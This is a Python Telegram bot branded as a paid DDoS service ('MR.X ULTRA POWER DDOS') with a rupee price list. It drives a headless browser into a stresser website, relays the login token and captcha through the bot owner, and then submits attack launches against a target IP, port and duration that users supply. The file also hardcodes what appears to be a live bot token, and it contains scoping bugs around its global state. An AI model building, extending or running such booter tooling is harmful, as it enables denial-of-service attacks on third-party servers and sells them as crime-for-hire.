import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIG ====================
BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471
CHROME_PATH = "/usr/bin/google-chrome"

DATA_JSON = "users_data.json"
COOKIES_FILE = "session_cookies.pkl"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}
driver = None
logged_in = False
data = {
    "approved_users": {},
    "disapproved_users": []
}

# ==================== DATA MGMT ====================
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON) as f:
                data = json.load(f)
    except:
        pass

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def is_owner(user_id):
    return user_id == OWNER_ID

def is_approved(user_id):
    if is_owner(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        return True
    return False

def save_cookies():
    global driver
    try:
        if driver:
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(driver.get_cookies(), f)
    except:
        pass

def load_cookies():
    global driver
    try:
        if driver and os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'rb') as f:
                for cookie in pickle.load(f):
                    driver.add_cookie(cookie)
            return True
    except:
        pass
    return False

async def initialize_browser():
    global driver
    try:
        if driver:
            return True
        options = Options()
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        return True
    except Exception as e:
        logger.error(f"Browser init error: {e}")
        return False

# ==================== KEYBOARDS ====================
def owner_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Login", callback_data="login"),
         InlineKeyboardButton("🔍 Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove", callback_data="disapprove")],
        [InlineKeyboardButton("🚀 Attack", callback_data="run"),
         InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("🔴 Logout", callback_data="logout")]
    ])

def approved_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Attack", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ])

def user_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ])

# ==================== STYLED MESSAGES (for users) ====================
STYLED = {
    "welcome_owner": "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n👑 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗢𝘄𝗻𝗲𝗿!\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:",
    "welcome_approved": "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n✅ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}!\n𝗬𝗼𝘂 𝗮𝗿𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:",
    "welcome_user": "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n📌 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗕𝗼𝘁\n𝗥𝗲𝗱𝗲𝗲𝗺 𝗮 𝗸𝗲𝘆 𝘁𝗼 𝗴𝗲𝘁 𝗮𝗰𝗰𝗲𝘀𝘀.\n\n💰 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧:\n▫️ 1 𝗗𝗮𝘆    – ₹200 🔥\n▫️ 1 𝗪𝗲𝗲𝗸   – ₹700 🔥\n▫️ 1 𝗠𝗼𝗻𝘁𝗵  – ₹1500 🔥\n\n🛒 𝗧𝗼 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:",
    "already_logged": "✅ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗹𝗼𝗴𝗴𝗲𝗱 𝗶𝗻! 🍪",
    "login_success": "✅ 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉\n\n🚀 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝗮𝘁𝘁𝗮𝗰𝗸!",
    "status_logged": "✅ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡 🟢",
    "status_not": "❌ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗡𝗢𝗧 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡 🔴",
    "status_error": "❌ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝗥𝗥𝗢𝗥 ⚠️",
    "logout": "✅ 𝗕𝗿𝗼𝘄𝘀𝗲𝗿 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗰𝗹𝗼𝘀𝗲𝗱. 🔴",
    "ready_attack": "🚀 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞 🚀\n\n𝗧𝘆𝗽𝗲 👉: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>",
    "invalid_format": "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁\n\n𝗨𝘀𝗲 👉: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>",
    "time_error": "❌ 𝗧𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 30-300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
    "invalid_numbers": "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿𝘀",
    "preparing": "⚡ 𝗪𝗮𝗶𝘁 5 𝗦𝗲𝗰𝗼𝗻𝗱𝘀...",
    "attack_success": "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗬: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠\n🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {ip}\n🔌 𝗣𝗢𝗥𝗧: {port}\n⏰ 𝗧𝗜𝗠𝗘: {time}𝘀\n🌎 𝗚𝗔𝗠𝗘: 𝗕𝗚𝗠𝗜",
    "attack_error": "❌ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗘𝗿𝗿𝗼𝗿\n\n{error}",
    "status_owner": "👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {id}\n📛 𝗡𝗮𝗺𝗲: {name}\n\n✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗢𝘄𝗻𝗲𝗿)\n⏰ 𝗘𝘅𝗽𝗶𝗿𝘆: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱",
    "status_approved": "👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {id}\n📛 𝗡𝗮𝗺𝗲: {name}\n\n✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expiry}",
    "status_not_approved": "👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {id}\n📛 𝗡𝗮𝗺𝗲: {name}\n\n❌ 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n\n𝗧𝗼 𝗯𝘂𝘆 𝗸𝗲𝘆: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠",
    "approve_prompt": "✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱: <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗱𝗮𝘆𝘀>",
    "approve_success": "✅ 𝗨𝘀𝗲𝗿 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n\n👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {id}\n📅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} 𝗱𝗮𝘆𝘀\n⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expiry}",
    "disapprove_prompt": "❌ 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲𝗿 𝗜𝗗:",
    "disapprove_success": "❌ 𝗨𝘀𝗲𝗿 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n\n👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {id}",
    "stats": "📊 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {approved}\n❌ 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {disapproved}"
}

# ==================== COMMAND HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "User"
    if is_owner(uid):
        await update.message.reply_text(STYLED["welcome_owner"], reply_markup=owner_keyboard())
    elif is_approved(uid):
        await update.message.reply_text(STYLED["welcome_approved"].format(name=name), reply_markup=approved_keyboard())
    else:
        await update.message.reply_text(STYLED["welcome_user"], reply_markup=user_keyboard())

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    uid = q.from_user.id

    if data == "login":
        if not is_owner(uid):
            await q.message.reply_text("❌ Not authorized.")
            return
        try:
            if not driver and not await initialize_browser():
                await q.message.reply_text("❌ Browser init failed")
                return
            driver.get("https://satellitestress.st/login")
            await asyncio.sleep(10)
            if load_cookies():
                driver.refresh()
                await asyncio.sleep(5)
                if "dashboard" in driver.current_url:
                    logged_in = True
                    await q.message.reply_text(STYLED["already_logged"])
                    return
            driver.save_screenshot("login.png")
            with open("login.png", "rb") as f:
                await q.message.reply_photo(f, caption="📸 Login Page Loaded.\n\n🔑 Please send the Access Token:")
            os.remove("login.png")
            user_state[OWNER_ID] = "waiting_token"
        except Exception as e:
            await q.message.reply_text(f"❌ Login Error: {e}")

    elif data == "check":
        if not driver:
            await q.message.reply_text(STYLED["status_error"])
            return
        try:
            if "dashboard" in driver.current_url:
                logged_in = True
                await q.message.reply_text(STYLED["status_logged"])
            else:
                logged_in = False
                await q.message.reply_text(STYLED["status_not"])
        except:
            await q.message.reply_text(STYLED["status_error"])

    elif data == "logout":
        if driver:
            driver.quit()
            driver = None
        logged_in = False
        await q.message.reply_text(STYLED["logout"])

    elif data == "run":
        if not is_approved(uid):
            await q.message.reply_text("❌ Not authorized.")
            return
        if not logged_in or not driver:
            await q.message.reply_text("❌ Not logged in.")
            return
        user_state[uid] = "awaiting_attack"
        await q.message.reply_text(STYLED["ready_attack"])

    elif data == "stats":
        approved = len(data["approved_users"])
        disapproved = len(data["disapproved_users"])
        await q.message.reply_text(STYLED["stats"].format(approved=approved, disapproved=disapproved))

    elif data == "my_status":
        if is_owner(uid):
            await q.message.reply_text(STYLED["status_owner"].format(id=uid, name=update.effective_user.first_name))
        elif is_approved(uid):
            expiry = data["approved_users"].get(str(uid), {}).get("expiry", "N/A")
            await q.message.reply_text(STYLED["status_approved"].format(id=uid, name=update.effective_user.first_name, expiry=expiry))
        else:
            await q.message.reply_text(STYLED["status_not_approved"].format(id=uid, name=update.effective_user.first_name))

    elif data == "approve":
        if not is_owner(uid):
            await q.message.reply_text("❌ Not authorized.")
            return
        user_state[uid] = "awaiting_approve"
        await q.message.reply_text(STYLED["approve_prompt"])

    elif data == "disapprove":
        if not is_owner(uid):
            await q.message.reply_text("❌ Not authorized.")
            return
        user_state[uid] = "awaiting_disapprove"
        await q.message.reply_text(STYLED["disapprove_prompt"])

# ==================== MESSAGE HANDLER ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if uid == OWNER_ID and uid in user_state:
        if user_state[uid] == "waiting_token":
            try:
                wait = WebDriverWait(driver, 15)
                wait.until(EC.presence_of_element_located((By.ID, "token"))).send_keys(text)
                driver.save_screenshot("captcha.png")
                with open("captcha.png", "rb") as f:
                    await update.message.reply_photo(f, caption="✅ Token Entered.\n\n🔢 Now send the Captcha characters:")
                os.remove("captcha.png")
                user_state[uid] = "waiting_captcha"
            except Exception as e:
                await update.message.reply_text(f"❌ Token Error: {e}")
                user_state.pop(uid, None)
        elif user_state[uid] == "waiting_captcha":
            try:
                driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']").send_keys(text)
                driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
                await asyncio.sleep(6)
                if "dashboard" in driver.current_url:
                    logged_in = True
                    save_cookies()
                    await update.message.reply_text(STYLED["login_success"])
                else:
                    driver.save_screenshot("fail.png")
                    with open("fail.png", "rb") as f:
                        await update.message.reply_photo(f, caption="❌ Login failed.")
                    os.remove("fail.png")
            except Exception as e:
                await update.message.reply_text(f"❌ Login Error: {e}")
            finally:
                user_state.pop(uid, None)
        return

    if uid in user_state:
        if user_state[uid] == "awaiting_attack":
            parts = text.split()
            if len(parts) != 3:
                await update.message.reply_text(STYLED["invalid_format"])
                user_state.pop(uid, None)
                return
            ip, port, dur = parts
            try:
                port = int(port)
                dur = int(dur)
                if dur < 30 or dur > 300:
                    await update.message.reply_text(STYLED["time_error"])
                    return
            except:
                await update.message.reply_text(STYLED["invalid_numbers"])
                user_state.pop(uid, None)
                return
            await update.message.reply_text(STYLED["preparing"])
            try:
                driver.get("https://satellitestress.st/attack")
                await asyncio.sleep(6)
                w = WebDriverWait(driver, 20)
                w.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']"))).send_keys(ip)
                driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']").send_keys(str(port))
                driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']").send_keys(str(dur))
                w.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(),'Launch Attack')]"))).click()
                await asyncio.sleep(2)
                await update.message.reply_text(STYLED["attack_success"].format(ip=ip, port=port, time=dur))
            except Exception as e:
                await update.message.reply_text(STYLED["attack_error"].format(error=str(e)))
            user_state.pop(uid, None)

        elif user_state[uid] == "awaiting_approve":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Invalid format. Use: <id> <days>")
                user_state.pop(uid, None)
                return
            target, days = parts[0], int(parts[1])
            expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
            data["approved_users"][target] = {"expiry": expiry, "by": uid}
            if int(target) in data["disapproved_users"]:
                data["disapproved_users"].remove(int(target))
            save_data()
            await update.message.reply_text(STYLED["approve_success"].format(id=target, days=days, expiry=expiry))
            user_state.pop(uid, None)

        elif user_state[uid] == "awaiting_disapprove":
            try:
                target = int(text.strip())
                data["approved_users"].pop(str(target), None)
                if target not in data["disapproved_users"]:
                    data["disapproved_users"].append(target)
                save_data()
                await update.message.reply_text(STYLED["disapprove_success"].format(id=target))
            except:
                await update.message.reply_text("❌ Invalid ID")
            finally:
                user_state.pop(uid, None)

# ==================== MAIN ====================
def main():
    load_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 MR.X BOT RUNNING (Styled msgs, Normal login)")
    app.run_polling()

if __name__ == "__main__":
    main()